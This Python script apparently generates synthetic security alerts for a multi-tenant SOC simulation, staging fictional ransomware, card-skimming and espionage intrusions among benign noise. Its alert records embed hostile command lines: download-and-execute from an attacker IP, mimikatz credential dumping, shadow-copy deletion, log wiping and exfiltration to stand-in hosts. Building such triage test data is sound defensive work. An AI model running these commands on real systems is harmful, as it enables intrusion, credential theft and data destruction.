"""Generate sim4_msp_multi_tenant.json — 400 alerts across 3 customers + noise."""
import json
import os
import random
from datetime import datetime, timedelta

random.seed(42)

alerts = []

def ts(base_dt, offset_min):
    """Return ISO timestamp offset from base."""
    return (base_dt + timedelta(minutes=offset_min)).strftime("%Y-%m-%dT%H:%M:%SZ")

# ============================================================================
# CUSTOMER 1: Davis & Partners — Ransomware Attack (100 alerts)
# Attacker: 91.215.85.72 (RU), April 10 14:00-16:00 UTC
# ============================================================================
c1_base = datetime(2026, 4, 10, 14, 0, 0)
c1_attacker = "91.215.85.72"

# Phishing detected (5) — targeting paralegal.amy
for i in range(5):
    alerts.append({
        "event_type": "phishing_detected",
        "timestamp": ts(c1_base, i * 3),
        "user": "paralegal.amy@davis-law.com",
        "ip_address": c1_attacker,
        "severity": "high",
        "hostname": "AMY-LAPTOP",
        "description": f"Phishing email detected targeting paralegal.amy — malicious attachment invoice_{i+1}.docm",
        "customer": "Davis & Partners",
        "country": "RU",
        "subject": f"Urgent: Invoice #{random.randint(10000,99999)} Requires Immediate Review",
    })

# Suspicious sign-in (10) — from attacker IP
for i in range(10):
    user = random.choice(["paralegal.amy@davis-law.com", "partner.rick@davis-law.com", "it.admin@davis-law.com"])
    alerts.append({
        "event_type": "suspicious_signin",
        "timestamp": ts(c1_base, 15 + i * 2),
        "user": user,
        "ip_address": c1_attacker,
        "severity": "high",
        "hostname": "UNKNOWN-PC",
        "description": f"Suspicious sign-in from {c1_attacker} (Russia) for {user}",
        "customer": "Davis & Partners",
        "country": "RU",
    })

# Login success (5) — credential theft succeeded
for i in range(5):
    user = random.choice(["paralegal.amy@davis-law.com", "it.admin@davis-law.com"])
    alerts.append({
        "event_type": "login_success",
        "timestamp": ts(c1_base, 35 + i * 3),
        "user": user,
        "ip_address": c1_attacker,
        "severity": "medium",
        "hostname": "DC01-DAVIS",
        "description": f"Successful authentication for {user} from {c1_attacker}",
        "customer": "Davis & Partners",
        "country": "RU",
    })

# Process execution (20) — Cobalt Strike beacons, PowerShell
c1_commands = [
    "powershell.exe -nop -w hidden -encodedcommand JABjAGwAaQBlAG4AdA...",
    "C:\\Windows\\Temp\\beacon_x64.exe",
    "cmd.exe /c whoami /all",
    "cmd.exe /c net group \"Domain Admins\" /domain",
    "powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://91.215.85.72/a')",
    "rundll32.exe C:\\Users\\amy\\AppData\\Local\\Temp\\evil.dll,DllMain",
    "cmd.exe /c nltest /dclist:davis-law.local",
    "powershell.exe -ep bypass -f C:\\Users\\amy\\Documents\\stage2.ps1",
    "cmd.exe /c systeminfo",
    "cmd.exe /c ipconfig /all",
    "powershell.exe Get-ADUser -Filter * -Properties *",
    "cmd.exe /c tasklist /v",
    "cmd.exe /c netstat -ano",
    "cmd.exe /c net view \\\\DC01-DAVIS /all",
    "C:\\Windows\\Temp\\mimikatz.exe privilege::debug sekurlsa::logonpasswords",
    "cmd.exe /c reg save HKLM\\SAM C:\\temp\\sam.save",
    "cmd.exe /c reg save HKLM\\SYSTEM C:\\temp\\system.save",
    "powershell.exe Invoke-Mimikatz -DumpCreds",
    "cmd.exe /c net user admin P@ssw0rd123! /add /domain",
    "cmd.exe /c net localgroup administrators admin /add",
]
for i in range(20):
    alerts.append({
        "event_type": "process_execution",
        "timestamp": ts(c1_base, 50 + i * 2),
        "user": random.choice(["paralegal.amy@davis-law.com", "it.admin@davis-law.com"]),
        "ip_address": c1_attacker,
        "severity": "high",
        "hostname": random.choice(["AMY-LAPTOP", "DC01-DAVIS", "FILESVR-01"]),
        "command_line": c1_commands[i],
        "process_name": c1_commands[i].split()[0].split("\\")[-1],
        "description": f"Suspicious process execution: {c1_commands[i][:60]}",
        "customer": "Davis & Partners",
        "country": "RU",
    })

# Suspicious process (15) — ransomware prep
c1_ransom_cmds = [
    "vssadmin.exe delete shadows /all /quiet",
    "bcdedit.exe /set {default} recoveryenabled no",
    "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
    "wmic.exe shadowcopy delete",
    "wbadmin.exe delete catalog -quiet",
    "cmd.exe /c cipher /w:C:\\",
    "powershell.exe Remove-Item -Path C:\\Windows\\System32\\winevt\\Logs\\* -Force",
    "icacls.exe C:\\Users\\* /grant Everyone:(OI)(CI)F /T",
    "cmd.exe /c net stop \"Volume Shadow Copy\" /y",
    "cmd.exe /c net stop \"Windows Defender\" /y",
    "cmd.exe /c net stop MSSQLSERVER /y",
    "cmd.exe /c net stop SQLWriter /y",
    "cmd.exe /c sc config WinDefend start=disabled",
    "C:\\Windows\\Temp\\encryptor.exe --target C:\\Users --ext .locked --key RSA-2048",
    "cmd.exe /c copy C:\\Windows\\Temp\\README_DECRYPT.txt C:\\Users\\Public\\Desktop\\",
]
for i in range(15):
    alerts.append({
        "event_type": "suspicious_process",
        "timestamp": ts(c1_base, 90 + i * 2),
        "user": "it.admin@davis-law.com",
        "ip_address": c1_attacker,
        "severity": "critical",
        "hostname": random.choice(["DC01-DAVIS", "FILESVR-01", "AMY-LAPTOP", "RICK-DESKTOP"]),
        "command_line": c1_ransom_cmds[i],
        "process_name": c1_ransom_cmds[i].split()[0].split("\\")[-1],
        "description": f"Ransomware preparation: {c1_ransom_cmds[i][:60]}",
        "customer": "Davis & Partners",
        "country": "RU",
    })

# Privilege escalation (10)
for i in range(10):
    alerts.append({
        "event_type": "privilege_escalation",
        "timestamp": ts(c1_base, 70 + i * 3),
        "user": random.choice(["paralegal.amy@davis-law.com", "it.admin@davis-law.com"]),
        "ip_address": c1_attacker,
        "severity": "critical",
        "hostname": "DC01-DAVIS",
        "description": f"Privilege escalation: user added to Domain Admins group",
        "customer": "Davis & Partners",
        "country": "RU",
        "action": "privilege_escalation",
    })

# Large data transfer (10) — pre-encryption exfiltration
for i in range(10):
    size_gb = round(random.uniform(0.5, 3.0), 1)
    alerts.append({
        "event_type": "large_data_transfer",
        "timestamp": ts(c1_base, 100 + i * 2),
        "user": "it.admin@davis-law.com",
        "ip_address": c1_attacker,
        "dest_ip": "185.220.101.45",
        "severity": "critical",
        "hostname": "FILESVR-01",
        "description": f"Large outbound transfer: {size_gb}GB to 185.220.101.45 (Tor exit node)",
        "customer": "Davis & Partners",
        "country": "RU",
        "bytes_transferred": int(size_gb * 1073741824),
    })

# ============================================================================
# CUSTOMER 2: ShopFast Inc — Credit Card Skimmer (80 alerts)
# Attacker: 178.128.88.12 (NL), April 10 08:00-10:00 UTC
# ============================================================================
c2_base = datetime(2026, 4, 10, 8, 0, 0)
c2_attacker = "178.128.88.12"

# Suspicious sign-in (8)
for i in range(8):
    alerts.append({
        "event_type": "suspicious_signin",
        "timestamp": ts(c2_base, i * 5),
        "user": "webdev@shopfast.io",
        "ip_address": c2_attacker,
        "severity": "high",
        "hostname": "WEB-PROD-01",
        "description": f"Suspicious sign-in for webdev@shopfast.io from {c2_attacker} (Netherlands)",
        "customer": "ShopFast Inc",
        "country": "NL",
    })

# Process execution (15) — git clone, npm install malicious packages
c2_commands = [
    "git clone https://github.com/evilcorp/payment-helper.git",
    "npm install --save stripe-validator-pro@1.0.0",
    "npm install --save checkout-analytics-sdk@2.3.1",
    "node inject_skimmer.js --target /var/www/checkout/payment.js",
    "curl -s https://cdn.shopfast-analytics.com/track.js -o /var/www/static/track.js",
    "node -e 'require(\"child_process\").exec(\"curl http://178.128.88.12/c2\")'",
    "git add -A && git commit -m 'update analytics'",
    "npm run build -- --env production",
    "pm2 restart checkout-service",
    "node /tmp/card_test.js --batch --cards /tmp/dump.csv",
    "curl -X POST https://api.stripe.com/v1/tokens -d 'card[number]=4242424242424242'",
    "node harvest.js --interval 30s --output /tmp/cards.json",
    "tar czf /tmp/export_$(date +%s).tar.gz /tmp/cards.json",
    "scp /tmp/export_*.tar.gz drop@178.128.88.12:/data/",
    "crontab -e  # Added: */5 * * * * node /var/www/.hidden/skim.js",
]
for i in range(15):
    alerts.append({
        "event_type": "process_execution",
        "timestamp": ts(c2_base, 20 + i * 3),
        "user": random.choice(["webdev@shopfast.io", "deploy-bot@shopfast.io"]),
        "ip_address": c2_attacker,
        "severity": "high",
        "hostname": random.choice(["WEB-PROD-01", "WEB-PROD-02", "BUILD-SERVER"]),
        "command_line": c2_commands[i],
        "process_name": c2_commands[i].split()[0],
        "description": f"Process execution on ShopFast prod: {c2_commands[i][:60]}",
        "customer": "ShopFast Inc",
        "country": "NL",
    })

# Suspicious process (15) — Node.js injection
c2_sus_procs = [
    "node /var/www/.hidden/skim.js --inject checkout",
    "node -e 'fs.appendFileSync(\"/var/www/checkout/payment.js\", skimCode)'",
    "node /tmp/cc_validator.js --test-mode",
    "node /var/www/scripts/override_csp.js",
    "node /tmp/exfil_worker.js --endpoint https://collect.evil.com/cc",
    "node /var/www/.hidden/keylog.js --fields cc,cvv,exp",
    "node /tmp/stripe_proxy.js --intercept",
    "node /var/www/scripts/patch_checkout.js --silent",
    "node -e 'http.createServer((req,res)=>{/* proxy */}).listen(8443)'",
    "node /tmp/card_test.js --live --limit 50",
    "node /var/www/.hidden/dom_inject.js --target form#payment",
    "node /tmp/bulk_test.js --cards /tmp/dump_20260410.csv",
    "node /var/www/scripts/analytics_hook.js --capture payment",
    "node /tmp/encrypt_dump.js --aes256 --out /tmp/enc_cards.bin",
    "node /var/www/.hidden/persist.js --cron --interval 300",
]
for i in range(15):
    alerts.append({
        "event_type": "suspicious_process",
        "timestamp": ts(c2_base, 40 + i * 3),
        "user": "deploy-bot@shopfast.io",
        "ip_address": c2_attacker,
        "severity": "critical",
        "hostname": random.choice(["WEB-PROD-01", "WEB-PROD-02"]),
        "command_line": c2_sus_procs[i],
        "process_name": "node",
        "description": f"Suspicious Node.js process: {c2_sus_procs[i][:60]}",
        "customer": "ShopFast Inc",
        "country": "NL",
    })

# Anomalous API calls (10) — Stripe API to test stolen cards
for i in range(10):
    alerts.append({
        "event_type": "anomalous_api_call",
        "timestamp": ts(c2_base, 70 + i * 3),
        "user": "deploy-bot@shopfast.io",
        "ip_address": c2_attacker,
        "severity": "high",
        "hostname": "WEB-PROD-01",
        "description": f"Anomalous Stripe API call: POST /v1/tokens — card testing pattern detected ({i*5+10} calls/min)",
        "customer": "ShopFast Inc",
        "country": "NL",
        "api_endpoint": "https://api.stripe.com/v1/tokens",
    })

# Large data transfer (10) — exfiltrating card data
for i in range(10):
    cards = random.randint(500, 5000)
    alerts.append({
        "event_type": "large_data_transfer",
        "timestamp": ts(c2_base, 85 + i * 3),
        "user": "deploy-bot@shopfast.io",
        "ip_address": c2_attacker,
        "dest_ip": "178.128.88.12",
        "severity": "critical",
        "hostname": "WEB-PROD-01",
        "description": f"Data exfiltration: {cards} card records ({round(cards*0.002, 1)}MB) to drop server",
        "customer": "ShopFast Inc",
        "country": "NL",
        "bytes_transferred": cards * 2048,
    })

# CreateAccessKey (5) — AWS persistence
for i in range(5):
    alerts.append({
        "event_type": "createaccesskey",
        "timestamp": ts(c2_base, 100 + i * 5),
        "user": "webdev@shopfast.io",
        "ip_address": c2_attacker,
        "severity": "high",
        "hostname": "AWS-CONSOLE",
        "description": f"New AWS access key created: AKIA{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ234567', k=16))}",
        "customer": "ShopFast Inc",
        "country": "NL",
        "action": "CreateAccessKey",
    })

# Verify customer 2 count
c2_count = 8 + 15 + 15 + 10 + 10 + 5  # Should be 63... need more
# Add 17 more to reach 80
# Additional process_execution and suspicious_process to pad
for i in range(7):
    alerts.append({
        "event_type": "process_execution",
        "timestamp": ts(c2_base, 110 + i * 2),
        "user": "webdev@shopfast.io",
        "ip_address": c2_attacker,
        "severity": "high",
        "hostname": "WEB-PROD-01",
        "command_line": f"aws s3 cp s3://shopfast-backups/db/customers_{i}.sql /tmp/",
        "process_name": "aws",
        "description": f"AWS S3 download of customer database backup part {i+1}",
        "customer": "ShopFast Inc",
        "country": "NL",
    })
for i in range(10):
    alerts.append({
        "event_type": "suspicious_process",
        "timestamp": ts(c2_base, 55 + i * 2),
        "user": "deploy-bot@shopfast.io",
        "ip_address": c2_attacker,
        "severity": "high",
        "hostname": random.choice(["WEB-PROD-01", "WEB-PROD-02"]),
        "command_line": f"node /var/www/.hidden/tamper_{i}.js --obfuscate",
        "process_name": "node",
        "description": f"Suspicious obfuscated Node.js script execution #{i+1}",
        "customer": "ShopFast Inc",
        "country": "NL",
    })

# ============================================================================
# CUSTOMER 3: SteelCorp — Industrial Espionage (80 alerts)
# Attacker: 223.71.167.200 (CN), April 10 22:00 - April 11 01:00 UTC
# ============================================================================
c3_base = datetime(2026, 4, 10, 22, 0, 0)
c3_attacker = "223.71.167.200"

# Suspicious sign-in (10) — VPN logins from China
for i in range(10):
    user = random.choice(["engineer.zhang@steelcorp.com", "vpn-svc@steelcorp.com"])
    alerts.append({
        "event_type": "suspicious_signin",
        "timestamp": ts(c3_base, i * 8),
        "user": user,
        "ip_address": c3_attacker,
        "severity": "high",
        "hostname": "VPN-GW-01",
        "description": f"Off-hours VPN login for {user} from {c3_attacker} (China) at {ts(c3_base, i*8)}",
        "customer": "SteelCorp",
        "country": "CN",
    })

# Login success (5) — VPN auth
for i in range(5):
    alerts.append({
        "event_type": "login_success",
        "timestamp": ts(c3_base, 15 + i * 10),
        "user": "engineer.zhang@steelcorp.com",
        "ip_address": c3_attacker,
        "severity": "medium",
        "hostname": "VPN-GW-01",
        "description": f"Successful VPN authentication for engineer.zhang from {c3_attacker}",
        "customer": "SteelCorp",
        "country": "CN",
    })

# Process execution (10) — CAD file access and export
c3_commands = [
    "robocopy \\\\CADSVR-01\\Projects\\2026-TurbineBlade /E /Z /MT:16 E:\\staging\\",
    "7z a -mx=9 E:\\staging\\turbine_blade_v4.7z \\\\CADSVR-01\\Projects\\2026-TurbineBlade\\",
    "xcopy \\\\CADSVR-01\\Projects\\MetalAlloy-Specs\\*.dwg E:\\staging\\ /S",
    "dir \\\\CADSVR-01\\Projects /s /b > E:\\staging\\file_inventory.txt",
    "copy \\\\CADSVR-01\\Projects\\Proprietary\\heat-treatment-process.pdf E:\\staging\\",
    "rar a -hp\"s3cret\" E:\\staging\\alloy_specs.rar \\\\CADSVR-01\\Projects\\MetalAlloy-Specs\\",
    "powershell.exe Get-ChildItem -Path \\\\CADSVR-01\\Projects -Recurse -Include *.dwg,*.step,*.iges | Measure-Object -Property Length -Sum",
    "net use Z: \\\\CADSVR-01\\Projects\\Restricted /user:cad-admin Password1!",
    "robocopy Z:\\Military-Contract E:\\staging\\military /E /Z",
    "certutil -encode E:\\staging\\military\\contract_specs.pdf E:\\staging\\encoded.b64",
]
for i in range(10):
    alerts.append({
        "event_type": "process_execution",
        "timestamp": ts(c3_base, 30 + i * 5),
        "user": "engineer.zhang@steelcorp.com",
        "ip_address": c3_attacker,
        "severity": "high",
        "hostname": random.choice(["ENG-WS-03", "CADSVR-01"]),
        "command_line": c3_commands[i],
        "process_name": c3_commands[i].split()[0],
        "description": f"CAD file access/export: {c3_commands[i][:60]}",
        "customer": "SteelCorp",
        "country": "CN",
    })

# Suspicious process (10) — archive creation and encryption
c3_sus = [
    "7z a -mx=9 -pIndustrial2026! E:\\staging\\export_final.7z E:\\staging\\*",
    "gpg --symmetric --cipher-algo AES256 E:\\staging\\export_final.7z",
    "split -b 500m E:\\staging\\export_final.7z.gpg E:\\staging\\chunk_",
    "rar a -v500m -hp\"Steel2026\" E:\\staging\\cad_export.rar E:\\staging\\turbine_blade_v4.7z",
    "openssl enc -aes-256-cbc -in E:\\staging\\alloy_specs.rar -out E:\\staging\\encrypted.bin",
    "powershell.exe Compress-Archive -Path E:\\staging\\* -DestinationPath E:\\staging\\all_files.zip",
    "certutil -encode E:\\staging\\all_files.zip E:\\staging\\all_files.b64",
    "cmd.exe /c for %f in (E:\\staging\\chunk_*) do echo %f >> E:\\staging\\manifest.txt",
    "attrib +h +s E:\\staging",
    "cmd.exe /c del /q E:\\staging\\*.log E:\\staging\\*.tmp",
]
for i in range(10):
    alerts.append({
        "event_type": "suspicious_process",
        "timestamp": ts(c3_base, 80 + i * 5),
        "user": "engineer.zhang@steelcorp.com",
        "ip_address": c3_attacker,
        "severity": "critical",
        "hostname": "ENG-WS-03",
        "command_line": c3_sus[i],
        "process_name": c3_sus[i].split()[0],
        "description": f"Suspicious archiving/encryption: {c3_sus[i][:60]}",
        "customer": "SteelCorp",
        "country": "CN",
    })

# Large data transfer (15) — exfiltrating designs
for i in range(15):
    size_gb = round(random.uniform(0.3, 5.0), 1)
    dest = random.choice(["223.71.167.200", "103.224.182.50", "47.95.112.88"])
    alerts.append({
        "event_type": "large_data_transfer",
        "timestamp": ts(c3_base, 120 + i * 5),
        "user": "engineer.zhang@steelcorp.com",
        "ip_address": c3_attacker,
        "dest_ip": dest,
        "severity": "critical",
        "hostname": "ENG-WS-03",
        "description": f"Large outbound transfer: {size_gb}GB of CAD/engineering files to {dest}",
        "customer": "SteelCorp",
        "country": "CN",
        "bytes_transferred": int(size_gb * 1073741824),
    })

# Privilege escalation (5) — accessing restricted shares
for i in range(5):
    alerts.append({
        "event_type": "privilege_escalation",
        "timestamp": ts(c3_base, 60 + i * 10),
        "user": random.choice(["engineer.zhang@steelcorp.com", "cad-admin@steelcorp.com"]),
        "ip_address": c3_attacker,
        "severity": "high",
        "hostname": "DC01-STEEL",
        "description": f"Privilege escalation: accessing restricted engineering share /Projects/Restricted",
        "customer": "SteelCorp",
        "country": "CN",
        "action": "privilege_escalation",
    })

# Pad to 80: need 80 - (10+5+10+10+15+5) = 80-55 = 25 more
for i in range(15):
    alerts.append({
        "event_type": "suspicious_signin",
        "timestamp": ts(c3_base, 90 + i * 4),
        "user": random.choice(["cad-admin@steelcorp.com", "vpn-svc@steelcorp.com"]),
        "ip_address": c3_attacker,
        "severity": "high",
        "hostname": random.choice(["VPN-GW-01", "DC01-STEEL"]),
        "description": f"Additional suspicious VPN/AD login attempt from China IP during off-hours",
        "customer": "SteelCorp",
        "country": "CN",
    })
for i in range(10):
    alerts.append({
        "event_type": "process_execution",
        "timestamp": ts(c3_base, 140 + i * 3),
        "user": "engineer.zhang@steelcorp.com",
        "ip_address": c3_attacker,
        "severity": "high",
        "hostname": "ENG-WS-03",
        "command_line": f"find /path/to/engineering -name '*.step' -newer 2026-04-01 -exec cp {{}} /staging/ \\;",
        "process_name": "find",
        "description": f"Bulk file enumeration and copy of engineering files",
        "customer": "SteelCorp",
        "country": "CN",
    })

# ============================================================================
# CROSS-CUSTOMER NOISE (140 alerts)
# ============================================================================

# Normal login_success across all 3 customers (40 alerts, LOW)
normal_users = {
    "Davis & Partners": ["receptionist@davis-law.com", "billing@davis-law.com", "associate.jane@davis-law.com", "partner.rick@davis-law.com"],
    "ShopFast Inc": ["marketing@shopfast.io", "support@shopfast.io", "ceo@shopfast.io", "hr@shopfast.io"],
    "SteelCorp": ["hr.smith@steelcorp.com", "accounting@steelcorp.com", "manager.jones@steelcorp.com", "safety@steelcorp.com"],
}
normal_ips = {
    "Davis & Partners": ["72.14.205.100", "72.14.205.101", "72.14.205.102"],
    "ShopFast Inc": ["104.16.50.20", "104.16.50.21", "104.16.50.22"],
    "SteelCorp": ["198.51.100.10", "198.51.100.11", "198.51.100.12"],
}
for i in range(40):
    cust = random.choice(list(normal_users.keys()))
    user = random.choice(normal_users[cust])
    ip = random.choice(normal_ips[cust])
    alerts.append({
        "event_type": "login_success",
        "timestamp": ts(datetime(2026, 4, 10, 8, 0, 0), random.randint(0, 720)),
        "user": user,
        "ip_address": ip,
        "severity": "low",
        "hostname": f"OFFICE-PC-{random.randint(1,50):02d}",
        "description": f"Normal login for {user} from corporate network",
        "customer": cust,
        "country": "US",
    })

# Benign process from monitoring agents (30 alerts, LOW)
monitoring_procs = [
    "C:\\Program Files\\CrowdStrike\\CSFalconService.exe",
    "C:\\Program Files\\SentinelOne\\SentinelAgent.exe",
    "/opt/datadog/agent/bin/agent",
    "/usr/bin/prometheus-node-exporter",
    "C:\\Program Files\\Zabbix\\zabbix_agentd.exe",
    "/usr/bin/telegraf",
]
for i in range(30):
    cust = random.choice(list(normal_users.keys()))
    user = random.choice(normal_users[cust])
    alerts.append({
        "event_type": "benign_process",
        "timestamp": ts(datetime(2026, 4, 10, 0, 0, 0), random.randint(0, 1440)),
        "user": "SYSTEM",
        "ip_address": "127.0.0.1",
        "severity": "low",
        "hostname": f"MON-{random.randint(1,20):02d}",
        "command_line": random.choice(monitoring_procs),
        "process_name": random.choice(monitoring_procs).split("\\")[-1].split("/")[-1],
        "description": f"Monitoring agent heartbeat/scan",
        "customer": cust,
        "country": "US",
    })

# Service restart from infra (20 alerts, LOW)
services = ["nginx", "postgresql", "redis", "elasticsearch", "docker", "kubelet", "haproxy", "consul"]
for i in range(20):
    cust = random.choice(list(normal_users.keys()))
    svc = random.choice(services)
    alerts.append({
        "event_type": "service_restart",
        "timestamp": ts(datetime(2026, 4, 10, 2, 0, 0), random.randint(0, 480)),
        "user": "root",
        "ip_address": "10.0.0." + str(random.randint(1, 254)),
        "severity": "low",
        "hostname": f"SRV-{random.randint(1,30):02d}",
        "description": f"Service restart: {svc} restarted during maintenance window",
        "customer": cust,
        "country": "US",
        "service": svc,
    })

# Login failure from legitimate password resets (20 alerts, MEDIUM)
for i in range(20):
    cust = random.choice(list(normal_users.keys()))
    user = random.choice(normal_users[cust])
    ip = random.choice(normal_ips[cust])
    alerts.append({
        "event_type": "login_failure",
        "timestamp": ts(datetime(2026, 4, 10, 9, 0, 0), random.randint(0, 600)),
        "user": user,
        "ip_address": ip,
        "severity": "medium",
        "hostname": f"OFFICE-PC-{random.randint(1,50):02d}",
        "description": f"Failed login for {user} — password reset in progress",
        "customer": cust,
        "country": "US",
    })

# Suspicious sign-in from traveling employees at conferences (15 alerts, MEDIUM)
conference_ips = ["185.86.151.11", "195.154.203.20", "213.168.249.100", "77.95.64.30"]
conference_countries = ["DE", "FR", "JP", "SG"]
for i in range(15):
    cust = random.choice(list(normal_users.keys()))
    user = random.choice(normal_users[cust])
    alerts.append({
        "event_type": "suspicious_signin",
        "timestamp": ts(datetime(2026, 4, 10, 6, 0, 0), random.randint(0, 720)),
        "user": user,
        "ip_address": random.choice(conference_ips),
        "severity": "medium",
        "hostname": f"BYOD-{random.randint(1,20):02d}",
        "description": f"Sign-in from conference location: {user} at RSA Conference",
        "customer": cust,
        "country": random.choice(conference_countries),
    })

# Process execution from CI/CD pipelines (15 alerts, LOW)
cicd_cmds = [
    "docker build -t shopfast/web:v2.3.1 .",
    "npm run test -- --coverage",
    "pytest -v tests/ --junitxml=report.xml",
    "terraform plan -out=tfplan",
    "ansible-playbook deploy.yml -i production",
    "kubectl apply -f k8s/deployment.yaml",
    "gradle build --no-daemon",
    "mvn clean package -DskipTests",
]
for i in range(15):
    cust = random.choice(list(normal_users.keys()))
    cmd = random.choice(cicd_cmds)
    alerts.append({
        "event_type": "process_execution",
        "timestamp": ts(datetime(2026, 4, 10, 3, 0, 0), random.randint(0, 720)),
        "user": "ci-runner@" + cust.lower().replace(" & ", "-").replace(" ", "-") + ".com",
        "ip_address": "10.100.0." + str(random.randint(1, 50)),
        "severity": "low",
        "hostname": f"CI-RUNNER-{random.randint(1,10):02d}",
        "command_line": cmd,
        "process_name": cmd.split()[0],
        "description": f"CI/CD pipeline execution: {cmd[:50]}",
        "customer": cust,
        "country": "US",
    })

# Additional noise to reach 400 total (25 more)
# DNS queries and health checks — completely benign (25 alerts, LOW)
for i in range(25):
    cust = random.choice(list(normal_users.keys()))
    alerts.append({
        "event_type": "login_success",
        "timestamp": ts(datetime(2026, 4, 10, 7, 0, 0), random.randint(0, 840)),
        "user": random.choice(normal_users[cust]),
        "ip_address": random.choice(normal_ips[cust]),
        "severity": "low",
        "hostname": f"OFFICE-PC-{random.randint(51,99):02d}",
        "description": f"Normal morning login from corporate IP",
        "customer": cust,
        "country": "US",
    })

# ============================================================================
# Summary and output
# ============================================================================
print(f"Total alerts generated: {len(alerts)}")

# Count by customer
from collections import Counter
cust_counts = Counter(a.get("customer", "unknown") for a in alerts)
for c, n in sorted(cust_counts.items()):
    print(f"  {c}: {n}")

# Count by event_type
type_counts = Counter(a["event_type"] for a in alerts)
print("\nBy event_type:")
for t, n in sorted(type_counts.items(), key=lambda x: -x[1]):
    print(f"  {t}: {n}")

_out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sim4_msp_multi_tenant.json")
with open(_out, "w") as f:
    json.dump(alerts, f, indent=2)

print(f"\nFile written: sim4_msp_multi_tenant.json")
